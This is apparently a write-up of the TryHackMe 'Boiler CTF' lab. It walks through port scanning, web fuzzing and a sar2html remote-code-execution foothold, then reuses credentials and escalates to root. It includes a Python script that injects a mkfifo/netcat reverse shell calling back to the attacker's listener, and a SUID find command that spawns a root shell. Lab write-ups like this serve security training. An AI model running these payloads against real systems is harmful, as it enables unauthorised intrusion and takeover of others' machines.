---
title: "TryHackMe Writeup - Boiler CTF"

categories: [Tryhackme,Linux]

tags: [sar2html,find(privesc)]

image: https://tryhackme-images.s3.amazonaws.com/room-icons/4a800c6513239dbdfaf74ce869a88add.jpeg
---

THM - [https://tryhackme.com/room/boilerctf2](https://tryhackme.com/room/boilerctf2)

## RECONNISANCE

To begin perfomed port scan to check the open ports on the machine 

```bash
rustscan -a $ip --range 0-65535 -- -A -sCV -oA $ip 
```

```plaintext
PORT      STATE SERVICE REASON         VERSION
21/tcp    open  ftp     syn-ack ttl 63 vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.14.34.81
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp    open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-title: Apache2 Ubuntu Default Page: It works
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
10000/tcp open  http    syn-ack ttl 63 MiniServ 1.930 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
|_http-favicon: Unknown favicon MD5: AE6C3C9D070C10C75816F620F3E98AED
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
55007/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e3:ab:e1:39:2d:95:eb:13:55:16:d6:ce:8d:f9:11:e5 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8bsvFyC4EXgZIlLR/7o9EHosUTTGJKIdjtMUyYrhUpJiEdUahT64rItJMCyO47iZTR5wkQx2H8HThHT6iQ5GlMzLGWFSTL1ttIulcg7uyXzWhJMiG/0W4HNIR44DlO8zBvysLRkBSCUEdD95kLABPKxIgCnYqfS3D73NJI6T2qWrbCTaIG5QAS5yAyPERXXz3ofHRRiCr3fYHpVopUbMTWZZDjR3DKv7IDsOCbMKSwmmgdfxDhFIBRtCkdiUdGJwP/g0uEUtHbSYsNZbc1s1a5EpaxvlESKPBainlPlRkqXdIiYuLvzsf2J0ajniPUkvJ2JbC8qm7AaDItepXLoDt
|   256 ae:de:f2:bb:b7:8a:00:70:20:74:56:76:25:c0:df:38 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLIDkrDNUoTTfKoucY3J3eXFICcitdce9/EOdMn8/7ZrUkM23RMsmFncOVJTkLOxOB+LwOEavTWG/pqxKLpk7oc=
|   256 25:25:83:f2:a7:75:8a:a0:46:b2:12:70:04:68:5c:cb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPsAMyp7Cf1qf50P6K9P2n30r4MVz09NnjX7LvcKgG2p
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), Linux 5.4 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Sony Android TV (Android 5.0) (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Android 5.1 (92%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.92%E=4%D=4/3%OT=21%CT=%CU=37124%PV=Y%DS=2%DC=T%G=N%TM=642AB865%P=x86_64-pc-linux-gnu)
SEQ(SP=104%GCD=1%ISR=10B%TI=Z%CI=I%II=I%TS=8)
OPS(O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11NW7%O6=M506ST11)
WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)
ECN(R=Y%DF=Y%T=40%W=6903%O=M506NNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)
```

## ENUMERATION

Performed Fuzzing on the port 80 . Found a endpoint `/joomla` .

```bash
gobuster dir -u http://$ip/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -x .html,.txt,.php
```

```bash
http://10.10.177.11/index.html           (Status: 200) [Size: 11321]
http://10.10.177.11/manual               (Status: 301) [Size: 313] [--> http://10.10.177.11/manual/]
http://10.10.177.11/robots.txt           (Status: 200) [Size: 257]
http://10.10.177.11/joomla               (Status: 301) [Size: 313] [--> http://10.10.177.11/joomla/]
```

&nbsp;

On further enumeration on the endpoint `/joomla` found a intresting directory called `/_test`

```bash
ffuf -w /usr/share/wordlists/dirb/big.txt -u http://$ip/joomla/FUZZ -ic -v  -o fuz -of all
```

```bash
[Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 167ms]
| URL | http://10.10.67.130/joomla/_test
| --> | http://10.10.67.130/joomla/_test/
    * FUZZ: _test
```

## FOOTHOLD

At the endpoint point `/joomla/_test/`  there is service sar2html i s running .

The `sar2html` is vulnerable to Remote code execution.

![Untitled](/assets/img/boiler.png)

&nbsp;


Witten a  python script to automate the reverse shell part .

```python
import requests

payload={
'plot' : 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.14.34.81 445 >/tmp/f'
}

try:
    with requests.Session() as s:
        resp = s.get('http://10.10.67.130/joomla/_test/index.php',params=payload, allow_redirects=False)

finally:
    pass
```

&nbsp;

start a listener at the attacker end

```bash
pwncat-cs -lp 445
```

&nbsp;

Now the reverse_shell  script and we receive a reverse  connection as  `www-data` user 

![Untitled](/assets/img/boiler1.png)

## POST-EXPLOITATION

During the post exploitation under the directory `/var/www/html/joomla/_tests` there is file called `log.txt` which contains the user `basterd` password in the log 

![Untitled](/assets/img/boiler2.png)


&nbsp;

switch to the user to basterd and use the password obtained from logtxt

```bash
su basterd  # use the password obtained from logtxt
```

![Untitled](/assets/img/boiler3.png)


&nbsp;

there is file ``backup.sh` in the home directory of  basterd

![Untitled](/assets/img/boiler4.png)

&nbsp;

The file contains the password for the  user `stoner` inside the bash script .

![Untitled](/assets/img/boiler5.png)



## Privilege Escalation

While enumerating the suid bit binaries found that that , the `find` has suid bit is enabled 

```bash
find / -perm -u=s -type f 2>/dev/null
```

![Untitled](/assets/img/boiler6.png)

&nbsp;

To elevate the privileges to `root` user execute the below command :

```bash
/usr/bin/find . -exec /bin/bash -p \; -quit
```

![Untitled](/assets/img/boiler7.png)